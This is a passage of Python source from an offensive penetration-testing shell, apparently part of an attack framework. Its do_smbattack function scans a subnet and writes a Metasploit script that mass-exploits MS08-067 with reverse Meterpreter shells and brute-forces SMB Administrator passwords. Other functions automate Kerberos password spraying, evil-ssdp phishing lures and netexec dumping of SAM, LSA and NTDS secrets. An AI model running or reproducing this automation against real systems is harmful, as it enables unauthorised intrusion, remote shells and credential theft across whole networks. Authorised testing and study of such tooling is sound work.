            command = f"impacket-samrdump -port 445 -target-ip {self.params['rhost']} {hashis} -dc-ip {self.params['rhost']} {self.params['domain']}"
            print_msg(command)
            self.cmd(command)
            return
        else:
            print_msg(f"Try... impacket-samrdump -port 139  {self.params['rhost']}")
            self.cmd(f"impacket-samrdump -port 139  {self.params['rhost']}")
            print_msg(f"Try... impacket-samrdump -port 445  {self.params['rhost']}")
            self.cmd(f"impacket-samrdump -port 445  {self.params['rhost']}")

        return





    @cmd2.with_category("02. Scanning & Enumeration")
    def do_sessionssh(self, line):
        """
        Execute a command to list active SSH connections.

        This method uses `netstat` to display established (`ESTAB`) connections and filters the results to show only SSH connections.

        Parameters:
        - line: Unused parameter in this function.

        Returns:
        - None

        Examples:
        >>> do_sessionssh("")
        (Displays active SSH connections in the console)
        """

        command = "netstat -putan |grep -i estab| grep ssh"
        print_msg("Lanzando netstat en busqueda de sessions ssh activas")
        copy2clip(command)
        self.cmd(command)
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_smbattack(self, line):
        """
        Scans for hosts with SMB service open on port 445 in the specified target network.

        This function performs the following actions:
        1. Scans the specified subnet for hosts with an open SMB port (445).
        2. Sets up a Metasploit handler to listen for reverse connections.
        3. Attempts to exploit the Conficker vulnerability on each identified host.
        4. Optionally conducts a brute-force attack on SMB using the provided password file.

        Parameters:
        line (str): The command line input for the smbattack function,
                    though not used directly in this implementation.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        if not check_rhost(self.params["rhost"]):
            return
        lport = self.params["lport"]
        if not check_lport(lport):
            return

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        passwd_file = self.params["wordlist"]
        file = "sessions/meta.rc"

        def find_tgts(subnet):
            """
            Finds and returns a list of target hosts with port 445 open in the specified subnet.

            Args:
                subnet (str): The subnet to scan, e.g., '192.168.1.0/24'.

            Returns:
                list: A list of IP addresses where port 445 is open.
            """
            nmap_proc = NmapProcess(subnet, options="-p 445 --open")
            nmap_proc.run()
            nmap_report = NmapParser.parse(nmap_proc.stdout)

            hosts = []
            for host in nmap_report.hosts:
                if (
                    host.is_up()
                    and "tcp" in host.services
                    and 445 in host.services["tcp"]
                    and host.services["tcp"][445].state == "open"
                ):
                    print_msg(f"[+] Found Target Host: {host.address}")
                    hosts.append(host.address)
            return hosts

        def setup_handler(config_file, lhost, lport):
            """
            Sets up a Metasploit multi/handler configuration in the given config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit handler configuration to.
                self.params['lhost'] (str): The local host IP address to listen for incoming connections.
                lport (int): The local port number to listen for incoming connections.

            Writes:
                - Exploit configuration for Metasploit to the provided file.
            """

            config_file.write("use exploit/multi/handler\n")
            config_file.write("set payload windows/meterpreter/reverse_tcp\n")
            config_file.write(f"set LPORT {str(lport)}\n")
            config_file.write(f"set LHOST {self.params['lhost']}\n")
            config_file.write("exploit -j -z\n")
            config_file.write("setg DisablePayloadHandler 0\n")

        def conficker_exploit(config_file, host, lhost, lport):
            """
            Configures and writes a Metasploit exploit for the Conficker vulnerability to the given config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit exploit configuration to.
                host (str): The target host IP address to exploit.
                lhost (str): The local host IP address to listen for incoming connections.
                lport (int): The local port number to listen for incoming connections.

            Writes:
                - Exploit configuration for the Conficker vulnerability (MS08-067) to the provided file.
            """
            config_file.write("use exploit/windows/smb/ms08_067_netapi\n")
            config_file.write(f"set RHOST {str(host)}\n")
            config_file.write("set payload windows/meterpreter/reverse_tcp\n")
            config_file.write(f"set LPORT {str(lport)}\n")
            config_file.write(f"set LHOST {self.params['lhost']}\n")
            config_file.write("exploit -j -z\n")

        def smb_brute(config_file, host, passwd_file, lhost, lport):
            """
            Configures and writes a Metasploit SMB brute force exploit for the given host to the provided config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit exploit configuration to.
                host (str): The target host IP address to exploit.
                passwd_file (str): Path to a file containing a list of passwords to use for brute force.
                lhost (str): The local host IP address to listen for incoming connections.
                lport (int): The local port number to listen for incoming connections.

            Writes:
                - Exploit configuration for SMB brute force (using the psexec module) to the provided file for each password in the passwd_file.
            """
            username = "Administrator"
            with open(passwd_file) as file:
                for password in file.readlines():
                    password = password.strip("\n").strip("\r")
                    config_file.write("use exploit/windows/smb/psexec\n")
                    config_file.write(f"set SMBUser {str(username)}\n")
                    config_file.write(f"set SMBPass {str(password)}\n")
                    config_file.write(f"set RHOST  {str(host)}\n")
                    config_file.write("set payload windows/meterpreter/reverse_tcp\n")
                    config_file.write(f"set LPORT {str(lport)}\n")
                    config_file.write(f"set LHOST {self.params['lhost']}\n")
                    config_file.write("exploit -j -z\n")

        flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW
        fd = os.open(file, flags, 0o600)
        try:
            with os.fdopen(fd, "w") as metarc_file:
                try:
                    os.chmod(file, 0o600)
                except OSError:
                    pass
                tgt_list = find_tgts(self.params["rhost"])
                setup_handler(metarc_file, self.params["lhost"], lport)

                for tgt_host in tgt_list:
                    conficker_exploit(metarc_file, tgt_host, self.params["lhost"], lport)
                    if passwd_file:
                        smb_brute(metarc_file, tgt_host, passwd_file, self.params["lhost"], lport)
        finally:
            try:
                os.chmod(file, 0o600)
            except OSError:
                pass
        command = f"msfconsole -r {file}"
        copy2clip(command)
        try:
            self.cmd(command)
        finally:
            if os.environ.get("LAZYOWN_KEEP_MSF_RC", "") != "1":
                try:
                    size = os.path.getsize(file)
                    with open(file, "r+b") as shred:
                        shred.write(b"\x00" * min(size, MSF_RC_SHRED_CAP_BYTES))
                        shred.flush()
                        os.fsync(shred.fileno())
                    os.unlink(file)
                except OSError:
                    pass
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_parsero(self, line):
        """
        Executes a parsero scan on a specified target URL or host.

        Usage:
            parsero -u <URL> [-o <output file>] [other options]

        If a URL is provided as an argument, it will be used as the target for the scan.
        Otherwise, it will use the target specified in self.params['rhost'].
        """
        if not is_binary_present("parsero"):
            print_warn("Installing parsero...")
            self.cmd("sudo apt install parsero -y")

        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        output_file = f"sessions/{rhost}_parsero_output.txt"
        cmd = ["parsero", "-u", rhost, "-sb"]

        try:
            with open(output_file, "w") as f:
                subprocess.run(cmd, check=True, stdout=f, stderr=subprocess.STDOUT)
            self.cmd(f"cat {output_file}")
        except subprocess.CalledProcessError as e:
            print_error(f"Error running parsero scan: {e}")



    @cmd2.with_category("02. Scanning & Enumeration")
    def do_fuzz(self, line):
        """
        Executes a web server fuzzing script with user-provided parameters.

        This function prompts the user for the necessary parameters to run the fuzzing script,
        including the target IP, port, HTTP method, directory, file extension, and expected status codes.

        Usage:
            fuzzing

        Parameters:
            line (str): The command line input for the function (not used directly in the current implementation).

        Returns:
            None

        Example:
            To run the fuzzing script, enter the required parameters when prompted by the function.
        """

        if not is_binary_present("closed_source_web_server_fuzz"):
            print_warn("Installing closed_source_web_server_fuzz...")
            self.cmd("sudo apt install spike -y")

        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(self.params["rhost"]):
                return
        target_port = self.ask("    [!] Enter the target port: ")
        http_method = self.ask("    [!] Enter the HTTP method (e.g., GET, POST): ")
        directory = self.ask("    [!] Enter the directory to fuzz (e.g., /): ")
        file_extension = self.ask("    [!] Enter the file extension to test (e.g., .php, .asp): ")
        additional_extension = self.ask("    [!] Enter any additional file extension (e.g., .zip): ")
        status_code_1 = self.ask("    [!] Enter the first expected status code (e.g., 200, 404): ")
        status_code_2 = self.ask("    [!] Enter the second expected status code (if any, otherwise leave blank): ")

        cmd = f"closed_source_web_server_fuzz {self.params['rhost']} {target_port} {http_method} {directory} {file_extension} {additional_extension} {status_code_1} {status_code_2}"

        print_msg(f"Try... {cmd} {RESET}")
        self.cmd(cmd)
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_kerbrute(self, line):
        """
        Executes the Kerbrute tool to enumerate user accounts against a specified target self.params['domain'] controller.

        This function performs the following actions:
        1. Retrieves necessary parameters such as the target URL and remote host (self.params['rhost']).
        2. Determines the self.params['domain'] based on the provided URL.
        3. Validates the remote host address.
        4. Constructs and executes the Kerbrute command to enumerate user accounts, saving the results in the sessions/users.txt file.

        Parameters:
        line (str): Specify 'pass' to use credentials from 'credentials.txt' for password spraying, 'brute' to brute force using 'users.txt' and the RockYou wordlist, or leave empty for default behavior.

        Returns:
        None

        Example:
        To enumerate user accounts using Kerbrute, ensure Kerbrute is in your path,
        then run this function to perform the enumeration.

        Note:
        - The function assumes that the Kerbrute binary (kerbrute_linux_amd64) is present in the system's PATH.
        - The file sessions/users.txt should exist and contain the list of usernames to enumerate.
        """
        path = os.getcwd()
        kerbrute_dir = f"{path}/external/.exploit/kerbrute"
        github = f"git clone https://github.com/ropnop/kerbrute.git {kerbrute_dir}"
        if not is_binary_present("kerbrute"):
            print_warn("Kerbrute is not found, Attemp to compile kerbrute...")
            self.cmd(github)
            compile = 'go build -ldflags "-s -w" . '
            self.cmd(f"cd {kerbrute_dir} && {compile} && upx kerbrute")

        self.params["url"]
        rhost = self.params["rhost"]
        path = os.getcwd()
        users_txt = get_users_dic()
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        if not check_rhost(self.params["rhost"]):
            return

        path_cred = "sessions/credentials.txt"

        if line == "pass":
            if not os.path.exists(path_cred):
                print_error("you need credentials.txt exec: createcredentials admin:admin")
                return
            with open(path_cred) as file:
                for file_line in file:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")
                    command = f"{kerbrute_dir}/kerbrute passwordspray --dc {self.params['rhost']} -d {self.params['domain']} -t 20 -v {users_txt} '{passwd}' | tee sessions/kerbrute_{self.params['rhost']}_{line}.txt"
                    print_msg(command)
                    self.cmd(command)

        if line == "brute":
            if not os.path.exists(users_txt):
                print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
                return
            wordlist = self.params["wordlist"]
            with open(users_txt) as file:
                for user in file:
                    user = user.strip()
                    command = f"{kerbrute_dir}/kerbrute bruteuser --dc {self.params['rhost']} -d {self.params['domain']} -t 20 -v {wordlist} {user}   | tee sessions/kerbrute_{self.params['rhost']}_{line}.txt"
                    print_msg(command)
                    self.cmd(command)
        else:
            choice_dc = self.ask("    [!] Do you wanna use dc option ? (y/n): ", "n")
            if choice_dc == "y":
                dc = f" --dc {subdomain} "
            else:
                dc = ""
            command = f"{kerbrute_dir}/kerbrute userenum --dc {self.params['rhost']} -d {self.params['domain']} {dc} -t 20 -v {users_txt}  | tee sessions/kerbrute_{self.params['rhost']}_userenum.txt"
            print_msg(command)
            self.cmd(command)
            choice = self.ask("Extend with larger dic ? (y/n)", "y")
            if choice == "y":
                users = self.params["usrwordlist"]
                command = f"{kerbrute_dir}/kerbrute userenum --dc {self.params['rhost']} -d {self.params['domain']} -t 20 -v {users}  | tee sessions/kerbrute_{self.params['rhost']}_userenum_rockyou.txt"
                print_msg(command)
                self.cmd(command)
        return


    @cmd2.with_category("02. Scanning & Enumeration")
    def do_evil_ssdp(self, line):
        """
        Runs evil-ssdp with various options and user-selected templates.

        :param line: Not used in this implementation but reserved for future use.

        :returns: None
        """
        if not is_binary_present("evil-ssdp"):
            print_warn("evil-ssdp is not installed. Installing.")
            self.cmd("sudo apt install evil-ssdp -y")
            return
        templates = ["bitcoin", "microsoft-azure", "office365", "password-vault", "scanner", "xxe-exfil", "xxe-smb"]
        print_warn("Select the template:")
        for i, template in enumerate(templates, start=1):
            print_msg(f"{i}. {template}")

        try:
            template_choice = int(self.ask("Enter the number corresponding to the template: ")) - 1
            if template_choice < 0 or template_choice >= len(templates):
                print_error("Invalid choice. Please select a valid number.")
                return
            lport = self.params["lport"]
            selected_template = templates[template_choice]
            interface = self.ask("Enter the network interface to listen on (e.g., wlp2s0): ")
            port = self.ask("Enter the port for the HTTP server (default seted in lport): ", lport)
            smb_server = self.ask("Enter the IP address of your SMB server (optional, press Enter to skip): ")
            realm = self.ask("Enter the realm for Basic Auth (optional, press Enter to skip): ")
            redirect_url = self.ask("Enter the URL to redirect after phishing (optional, press Enter to skip): ")
            evil_ssdp_command = f"sudo evil-ssdp -t {selected_template} -p {port} {interface}"

            if smb_server:
                evil_ssdp_command += f" -s {smb_server}"
            if realm:
                evil_ssdp_command += f" -r '{realm}'"
            if redirect_url:
                evil_ssdp_command += f" -u {redirect_url}"

            print_msg(f"Running evil-ssdp with command: {evil_ssdp_command}")
            self.cmd(evil_ssdp_command)

        except ValueError:
            print_error("Invalid input. Please enter a valid number.")
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_netexec(self, line):
        """
        Executes netexec with various options for network protocol operations.

        This function handles the installation of netexec and allows the user to execute various network protocol operations with minimal input.
        It reads credentials from a specified file and constructs the necessary commands to interact with the target system.

        :param line: Command line input from the user. This input is used to determine the protocol and action to be executed.
        :returns: None

        The function performs the following steps:
        1. Checks if netexec is installed. If not, it installs it.
        2. Reads credentials from a file.
        3. Constructs and executes the netexec command based on user input.
        4. Enumerates available protocols and actions for each protocol, allowing the user to select them interactively.
        5. Enumerates available options for each action, allowing the user to select them interactively.

        Example usage:
        ```
        do_netexec("smb target -u username -p password --shares")
        ```

        This will execute the SMB protocol with the specified action and options.

        If no specific command is provided, the function will prompt the user to select a protocol and action interactively.
        """

        def install_netexec():
            print_warn("netexec is not installed. Installing.")
            self.cmd("sudo apt install netexec -y")
            print_msg("Installation completed using apt.")

        def install_netexec_pipx():
            print_warn("netexec is not installed. Installing via pipx.")
            self.cmd("sudo apt install pipx git -y")
            self.cmd("pipx ensurepath")
            self.cmd("pipx install git+https://github.com/Pennyw0rth/NetExec")
            print_msg("Installation completed using pipx.")

        if not is_binary_present("netexec"):
            print_warn("netexec is not installed. Select installation method:")
            print_msg("1. Install using apt")
            print_msg("2. Install using pipx")

            try:
                install_choice = int(self.ask("    [!] Enter the number corresponding to the installation method: "))
                if install_choice == 1:
                    install_netexec()
                elif install_choice == 2:
                    install_netexec_pipx()
                else:
                    print_error("Invalid choice. Please select a valid number.")
                    return
            except ValueError:
                print_error("Invalid input. Please enter a valid number.")
                return

        rhost = self.params["rhost"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        path = os.getcwd()
        threads = 22
        timeout = 33
        jitter = 0

        if line:
            command_parts = line.split()
            protocol = command_parts[0]
            action = command_parts[1] if len(command_parts) > 1 else ""
            options = command_parts[2:]

            command = f"netexec {protocol} {self.params['rhost']}"

            if action:
                command += f" {action}"

            if options:
                command += " " + " ".join(options)

            self.cmd(command)
            return

        print_warn("Select the protocol you want to use:")
        protocols = ["ssh", "winrm", "smb", "rdp", "wmi", "mssql", "ldap", "ftp", "vnc"]
        for i, protocol in enumerate(protocols, start=1):
            print_msg(f"{i}. {protocol}")

        try:
            protocol_choice = int(self.ask("    [!] Enter the number corresponding to the protocol: ")) - 1
            if protocol_choice < 0 or protocol_choice >= len(protocols):
                print_error("Invalid choice. Please select a valid number.")
                return

            protocol = protocols[protocol_choice]
            actions = {
                "ssh": ["--continue-on-success"],
                "winrm": [],
                "smb": [
                    "--shares",
                    "--users",
                    "--rid-brute",
                    "--local-auth",
                    "-k",
                    "--gen-relay-list",
                    "--groups",
                    "--local-groups",
                    "--loggedon-users",
                    "--pass-pol",
                    "--sam",
                    "--lsa",
                    "--ntds",
                    "-M",
                ],
                "rdp": [],
                "wmi": [],
                "mssql": ["-x", "--get-file"],
                "ldap": [
                    "--users",
                    "--trusted-for-delegation",
                    "--password-not-required",
                    "--admin-count",
                    "--groups",
                    "--kerberoasting",
                    "--asreproast",
                    "--gmsa-convert-id",
                    "--gmsa-decrypt-lsa",
                    "--bloodhound",
                    "--maq",
                    "--adcs",
                ],
                "ftp": ["--ls"],
                "vnc": [],
            }
            if actions[protocol]:
                print_warn(f"Select the action for {protocol}:")
                for j, action in enumerate(actions[protocol], start=1):
                    print_msg(f"{j}. {action}")

                action_choice = int(self.ask("    [!] Enter the number corresponding to the action: ")) - 1
                if action_choice < 0 or action_choice >= len(actions[protocol]):
                    print_error("Invalid choice. Please select a valid number.")
                    return

                action = actions[protocol][action_choice]
            else:
                action = None

            options_dict = {
                "ssh": {"--continue-on-success": []},
                "winrm": {},
                "smb": {
                    "--shares": [],
                    "--users": [],
                    "--rid-brute": [],
                    "--local-auth": [],
                    "-k": [],
                    "--gen-relay-list": ["relay_list_file"],
                    "--groups": [],
                    "--local-groups": [],
                    "--loggedon-users": [],
                    "--pass-pol": [],
                    "--sam": [],
                    "--lsa": [],
                    "--ntds": [],
                    "-M": ["module_name"],
                },
                "rdp": {},
                "wmi": {},
                "mssql": {"-x": ["command"], "--get-file": ["output_file", "target_file"]},
                "ldap": {
                    "--users": [],
                    "--trusted-for-delegation": [],
                    "--password-not-required": [],
                    "--admin-count": [],
                    "--groups": [],
                    "--kerberoasting": ["kerb_file"],
                    "--asreproast": ["asrep_file"],
                    "--gmsa-convert-id": ["id"],
                    "--gmsa-decrypt-lsa": ["gmsa_account"],
                    "--bloodhound": ["-ns", "ip", "--collection", "All"],
                    "--maq": [],
                    "--adcs": [],
                },
                "ftp": {"--ls": ["folder_name"]},
                "vnc": {},
            }

            options = []

            if action:
                print_warn(f"Select the options for {action}:")
                for k, option in enumerate(options_dict[protocol][action], start=1):
                    print_msg(f"{k}. {option}")

                while True:
                    try:
                        option_choice = (
                            int(self.ask("    [!] Enter the number corresponding to the option (or 0 to finish): ")) - 1
                        )
                        if option_choice == -1:
                            break
                        if option_choice < 0 or option_choice >= len(options_dict[protocol][action]):
                            print_error("Invalid choice. Please select a valid number.")
                            continue
                        option_value = self.ask(
                            f"    [!] Enter the value for {options_dict[protocol][action][option_choice]}: "
                        )
                        options.append(f"{options_dict[protocol][action][option_choice]} {option_value}")
                    except ValueError:
                        print_error("Invalid input. Please enter a valid number.")

            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error(
                    "Not file credentials.txt in sessions directory to create use some like this: createcredentials admin:admin"
                )
                return

            path_cred = get_credentials(True)

            if not os.path.exists(path_cred):
                netexec_command = f"netexec {protocol} -t {threads} --timeout {timeout} --jitter {jitter} --log sessions/{self.params['rhost']}_netexec.txt"
            else:
                with open(path_cred) as file:
                    for file_line in file:
                        params = file_line.split(":")
                        username = params[0]
                        password = params[1].replace("\n", "")
                        netexec_command = f"netexec {protocol} -t {threads} --timeout {timeout} --jitter {jitter}  -u {username} -p '{password}' --log sessions/{self.params['rhost']}_{protocol}_netexec.txt "

            if options:
                netexec_command += " " + " ".join(options)
            choice = (
                self.ask(
                    f"   [!] Enter 1 to use ip enter 2 to use self.params['domain'] 3 use subdomain (default 1 {self.params['rhost']}): "
                , "1")
            )
            if choice == "1":
                netexec_command += f" {self.params['rhost']}"
            elif choice == "2":
                netexec_command += f" {self.params['domain']}"
            elif choice == "3":
                netexec_command += f" {subdomain}.{self.params['domain']}"
            else:
                netexec_command += f" {subdomain}"

            self.cmd(netexec_command)

        except ValueError:
            print_error("Invalid input. Please enter a valid number.")
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_allin(self, line):
        """
        Execute the AlliN.py tool with various scan modes and parameters.

        This function prompts the user to choose a scan type (e.g., pscan, sfscan, bakscan),
        and then asks for the necessary parameters (host, ports, project name, etc.).
        Based on the user's input, it generates the corresponding command and executes it.

        :param line: Not used in this implementation.
        :returns: None
        """
        if not is_binary_present("AlliN.py"):
            print_warn("AlliN.py not found. Installing...")
            command = "cd && mkdir AlliN && cd AlliN && wget https://github.com/P1-Team/AlliN/raw/main/AlliN.py"
            self.cmd(command)
            command = """
            bash -c '
            if [[ "$SHELL" == */bash ]]; then
                echo "    [!] Bash"
                echo "export PATH=$PATH:~/AlliN" >> ~/.bashrc
            elif [[ "$SHELL" == */zsh ]]; then
                echo "    [!] Zsh"
                echo "export PATH=$PATH:~/AlliN" >> ~/.zshrc
            fi
            '
            """.replace("            ", "")
            self.cmd(command)

        scan_options = {"1": "pscan", "2": "sfscan", "3": "bakscan", "4": "subscan", "5": "17scan", "6": "nbscan"}

        print_msg("Choose the type of scan to perform with AlliN.py:")
        for key, value in scan_options.items():
            print_msg(f"{key}. {value}")

        choice = self.ask("    [!] Enter your choice (1-6): ")
        if choice not in scan_options:
            print_error("Invalid choice. Please enter a number between 1 and 6.")
            return
        rhost = self.params["rhost"]
        host = (
            self.ask(
                f"    [!] Enter the host (e.g., 192.168.1.1/24 or self.params['domain'].com Default: {self.params['rhost']}): "
            , self.params["rhost"])
        )
        if not host:
            print_error("Host is required.")
            return

        project = self.ask("    [!] Enter the project name (default: scan_project): ", f"scan_project_{host}")
        timeout = self.ask("    [!] Enter timeout in seconds (default: 3): ", "3")
        threads = self.ask("    [!] Enter number of threads (default: 200): ", "200")
        ports = self.ask("    [!] Enter ports (optional, e.g., 80,443 or leave empty): ", "80,443")
        proxy = self.ask("    [!] Enter proxy (optional, e.g., socks5://127.0.0.1:1080 or leave empty): ")
        path = os.getcwd()
        sessions = f"{path}/sessions/"
        if choice == "5":
            python = "python2"
        else:
            python = "python3"
        command = f"cd && cd AlliN && {python} AlliN.py --host {host} --timeout {timeout} -t {threads} --project {sessions}{project} -m {scan_options[choice]}"

        if ports:
            command += f" -p {ports}"
        if proxy:
            command += f" --proxy {proxy}"
        print_msg(f"Generated command: {command}")
        self.cmd(command)
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_windapsearch(self, line):
        """
        Execute the windapsearch tool to perform Active Directory Domain enumeration through LDAP queries.

        This function allows the user to specify various parameters for executing different LDAP query modules
        using windapsearch. It handles user input for self.params['domain'], username, password, and other options, constructs
        the command, and executes it.

        :param line: Not used in this implementation.
        :returns: None
        """
        if not is_binary_present("go-windapsearch"):
            print_warn("windapsearch binary not found. Installing...")
            print_msg("Choose installation method for windapsearch:")
            print_msg("1. Download pre-compiled binaries (Linux amd64)")
            print_msg("2. Compile from source")
            username = os.getlogin()
            choice = self.ask("Enter choice (1 or 2): ")

            if choice == "1":
                binary_url = (
                    "https://github.com/ropnop/go-windapsearch/releases/download/v0.3.0/windapsearch-linux-amd64"
                )
                binary_path = f"/home/{username}/bin/go-windapsearch"

                if not os.path.exists(os.path.dirname(binary_path)):
                    os.makedirs(os.path.dirname(binary_path))

                self.cmd(f"wget -O {binary_path} {binary_url}")
                self.cmd(f"chmod +x {binary_path}")
                print_msg(f"Downloaded and made executable: {binary_path}")

            elif choice == "2":
                repo_url = "https://github.com/ropnop/go-windapsearch.git"
                project_dir = f"/home/{username}/bin/go-windapsearch"

                if not os.path.exists(project_dir):
                    os.makedirs(project_dir)
                command = """go get -u -d github.com/magefile/mage ;
                cd $GOPATH/src/github.com/magefile/mage ;
                go run bootstrap.go"""
                self.cmd(command)
                self.cmd(f"git clone {repo_url} {project_dir}")
                self.cmd(f"cd {project_dir} && go get github.com/magefile/mage")
                self.cmd(f"cd {project_dir} && mage build")
                print_msg("Compiled windapsearch from source.")
                self.cmd(f"{os.path.join(project_dir, 'windapsearch')} --version")

            else:
                print_error("Invalid choice. Please enter 1 or 2.")

        domain = (
            get_domain(self.params["url"])
            or self.ask("    [!] Enter the FQDN of the self.params['domain'] (e.g., 'lab.example.com'): ")
        )
        rhost = self.params["rhost"]
        if not self.params["domain"]:
            print_error("Domain is required.")
            return
        choice = self.ask("    [!] Use file credentials.txt? (y/n, default: n): ")
        if choice == "y":
            path_cred = "sessions/credentials.txt"

            if not os.path.exists(path_cred):
                username = self.ask(
                    "    [!] Enter the username with self.params['domain'] (e.g., 'user@self.params['domain'].com'): "
                )
                password = self.ask("    [!] Enter the password: ")
            else:
                with open(path_cred) as file:
                    for file_line in file:
                        params = file_line.split(":")
                        if not line:
                            username = params[0]
                        else:
                            username = line
                        password = params[1].replace("\n", "")
        else:
            command = f"windapsearch --dc {self.params['rhost']} --full -m users -o sessions/{self.params['rhost']}_windap.json -j y -v y"
            self.cmd(command)
            self.logcsv(f"windapsearch {command}")
            self.cmd(f"cat sessions/{self.params['rhost']}_windap.json | jq")
            self.do_windapsearchscrapeusers(f"sessions/{self.params['rhost']}_windap.json")
            return

        use_ntlm = self.ask("    [!] Use NTLM auth? (y/n, default: n): ").lower() or "n"
        ntlm_command = "--ntlm" if use_ntlm == "y" else ""

        use_ldaps = self.ask("    [!] Use LDAPS? (y/n, default: n): ").lower() or "n"
        ldaps_command = "--secure" if use_ldaps == "y" else ""

        output_file = (
            self.ask("    [!] Enter the output file (optional): ", f"sessions/{self.params['domain']}_windap.json")
        )
        output_command = f"-o {output_file}" if output_file else ""

        json_output = self.ask("    [!] Output in JSON format? (y/n, default: n): ").lower() or "n"
        json_command = "-j" if json_output == "y" else ""

        verbose = self.ask("    [!] Enable verbose logging? (y/n, default: n): ").lower() or "n"
        verbose_command = "-v" if verbose == "y" else ""

        module = (
            self.ask(
                "    [!] Enter the module to use (e.g., 'admin-objects' , 'computers', 'custom'   , 'dns-names', 'dns-zones', 'self.params['domain']-admins', 'gpos'' , 'groups'   , 'members'  , 'metadata' , 'privileged-users , 'search'   , 'unconstrained', 'user-spns', 'users' ): "
            , "users")
        )
        if not module:
            print_error("Module is required.")
            return

        module_options = self.ask("    [!] Enter any additional options for the module (optional): ")

        command = (
            f"windapsearch -d {self.params['domain']} -u {username} -p {password} {ntlm_command} {ldaps_command} "
            f"{output_command} {json_command} {verbose_command} -m {module} {module_options}"
        ).strip()

        print_msg(f"Generated command: {command}")
        self.cmd(command)
        self.logcsv(f"windapsearch {command}")
        self.cmd(f"cat {output_file} | jq")
        self.do_windapsearchscrapeusers(output_file)
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_ldapsearch(self, line):
        """
        Executes an LDAP search against a target remote host (self.params['rhost']) and saves the results.

        This function performs the following tasks:
        1. Extracts the target remote host (self.params['rhost']) from the class parameters.
        2. Verifies if the self.params['rhost'] is valid using a custom `check_rhost` function.
        3. Retrieves the self.params['domain'] information from the parameters.
        4. Ensures that the 'ldapsearch' binary is available on the system. If it's missing, the function attempts to install it using the system's package manager (`apt`).
        5. Constructs the LDAP search query based on the self.params['domain'] information, splitting the self.params['domain'] into components to form the correct base DN (Distinguished Name).
        6. Runs the LDAP search with the following options:
            - `-x`: Simple authentication (anonymous bind).
            - `-H`: Specifies the LDAP server URL (using the self.params['rhost']).
            - `-b`: Specifies the search base (constructed from the self.params['domain']).
            - `-s sub`: Indicates the search scope, where 'sub' performs a subtree search.
        7. Saves the result of the search to a log file under the 'sessions' directory, named based on the self.params['rhost'].
        8. Displays the log file content and checks for any 'lock' entries, which could indicate locked accounts or security incidents.
        9. Extracts `userPrincipalName` attributes from the log, parses them, and appends the usernames (without self.params['domain']) to a users.txt file for further analysis.

        This function is useful in penetration testing engagements where LDAP enumeration is part of the reconnaissance phase. It automates LDAP queries and extracts useful user information, which could assist in credential harvesting, password spraying, or other user-based attacks.
        """
        path = os.getcwd()
        rhost = self.params["rhost"]
        if not check_rhost(self.params["rhost"]):
            return
        domain = self.params["domain"]
        if not is_binary_present("ldapsearch"):
            print_warn("ldapsearch not found installing...")
            self.cmd("sudo apt install ldapsearch -y")
        log = f"sessions/ldapsearch_{self.params['rhost']}.txt"
        args = self.params["domain"].split(".") if self.params["domain"] else []
        dc0 = args[0] if len(args) > 0 else ""
        dc1 = args[1] if len(args) > 1 else ""
        if not os.path.exists(f"{path}/sessions/credentials.txt"):
            command = f"ldapsearch -x -H ldap://{self.params['rhost']} -b 'dc={dc0},dc={dc1}' -s sub > {log}"
        else:
            if line:
                credentials = get_credentials(ncred=int(line))
            else:
                credentials = get_credentials()

            if not credentials:
                return
            for username, password in credentials:
                command = (
                    "ldapsearch -x -H ldap://{self.params['rhost']} -D \"{username}@{self.params['domain']}\" -w \"{password}\" -b 'dc={dc0},dc={dc1}' \"(objectClass=user)\" sAMAccountName | grep \"sAMAccountName\" | awk '{print $2}' > sessions/ldapsearch_{self.params['rhost']}.txt".replace(
                        "{self.params['rhost']}", self.params["rhost"]
                    )
                    .replace("{username}", username)
                    .replace("{password}", password)
                    .replace("{self.params['domain']}", self.params["domain"])
                    .replace("{dc0}", dc0)
                    .replace("{dc1}", dc1)
                )

        self.cmd(command)
        self.cmd(f"cat {log} |  sed 's/requesting://' >> sessions/users.txt")
        self.cmd("tac sessions/users.txt | grep -v '^$' | sponge sessions/users.txt")
        return


    @cmd2.with_category("02. Scanning & Enumeration")
    def do_finger_user_enum(self, line):
        """
        Executes the `finger-user-enum` tool for enumerating users on the target host.

        This function checks if the `finger-user-enum` script is available locally; if not, it clones
        it from GitHub. It then constructs a command to run the tool with the provided wordlist of
        usernames and target host, and executes the command in the system.

        Parameters:
            line (str): Input line, not currently used.

        Returns:
            None: Outputs the command executed and any messages during execution.
        """
        path = os.getcwd()
        finger = f"{path}/modules_ext/finger-user-enum/finger-user-enum.pl"
        rhost = self.params["rhost"]
        usrwordlist = self.params["usrwordlist"]
        if not os.path.exists(finger):
            github = "git clone https://github.com/pentestmonkey/finger-user-enum.git modules_ext/finger-user-enum"
            print_warn("finger-user-enum not found cloning...")
            print_msg(github)
            self.cmd(github)

        use_small_dict = self.ask("    [?] Do you want to use the small dictionary? (yes/no): ").lower()

        if use_small_dict == "yes":
            path = os.getcwd()
            smalldic = f"{path}/modules/credentials.json"
            with open(smalldic) as f:
                data = json.load(f)

            with open("sessions/small_users.txt", "w") as f:
                for username in data["usernames"]:
                    if username:
                        f.write(username + "\n")
            small_users = get_users_dic()
            command = f"{finger} -U {small_users} -t {self.params['rhost']}"
        else:
            command = f"{finger} -U {usrwordlist} -t {self.params['rhost']}"
        print_msg(command)
        self.cmd(command)

        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_wpscan(self, line):
        """
